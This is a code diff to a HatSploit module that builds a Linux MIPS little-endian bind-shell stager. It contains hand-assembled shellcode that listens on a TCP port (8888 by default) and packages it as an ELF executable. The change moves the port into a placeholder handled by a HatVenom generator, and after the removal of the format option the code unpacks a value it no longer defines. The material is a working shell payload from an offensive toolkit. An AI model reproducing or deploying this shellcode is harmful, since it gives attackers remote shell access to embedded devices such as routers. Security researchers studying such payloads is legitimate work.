@@ -25,10 +25,10 @@
 #
 
 from core.lib.payload import Payload
-from utils.payload.payload import PayloadGenerator
+from utils.hatvenom.hatvenom import HatVenom
 
 
-class HatSploitPayload(Payload, PayloadGenerator):
+class HatSploitPayload(Payload, HatVenom):
     details = {
         'Category': "stager",
         'Name': "Linux mipsle Shell Bind TCP",
@@ -55,22 +55,15 @@ class HatSploitPayload(Payload, PayloadGenerator):
             'Value': 8888,
             'Type': "port",
             'Required': True
-        },
-        'FORMAT': {
-            'Description': "Executable format.",
-            'Value': "elf",
-            'Type': None,
-            'Required': True
         }
     }
 
     def run(self):
         bind_port, executable_format = self.parse_options(self.options)
-        bind_port = self.port_to_bytes(bind_port)
 
-        if executable_format not in self.formats.keys():
-            self.output_error("Invalid executable format!")
-            return
+        offsets = {
+            'bport': bind_port
+        }
 
         self.output_process("Generating shellcode...")
         shellcode = (
@@ -85,7 +78,7 @@ class HatSploitPayload(Payload, PayloadGenerator):
             b"\xff\xff\x50\x30"  # andi    s0,v0,0xffff
             b"\xef\xff\x0e\x24"  # li      t6,-17                        ; t6: 0xffffffef
             b"\x27\x70\xc0\x01"  # nor     t6,t6,zero                    ; t6: 0x10 (16)
-            + bind_port + b"\x0d\x24"  # li      t5,0xFFFF (port)   ; t5: 0x5c11 (0x115c == 8888 (default LPORT))
+            b":bport:port:\x0d\x24"  # li      t5,0xFFFF (port)   ; t5: 0x5c11 (0x115c == 8888 (default LPORT))
             b"\x04\x68\xcd\x01"  # sllv    t5,t5,t6                      ; t5: 0x5c110000
             b"\xfd\xff\x0e\x24"  # li      t6,-3                         ; t6: -3
             b"\x27\x70\xc0\x01"  # nor     t6,t6,zero                    ; t6: 0x2
@@ -140,6 +133,6 @@ class HatSploitPayload(Payload, PayloadGenerator):
         )
 
         self.output_process("Generating payload...")
-        payload = self.generate(executable_format, 'mipsle', shellcode)
+        payload = self.generate('elf', 'mipsle', shellcode, offsets)
 
         return payload
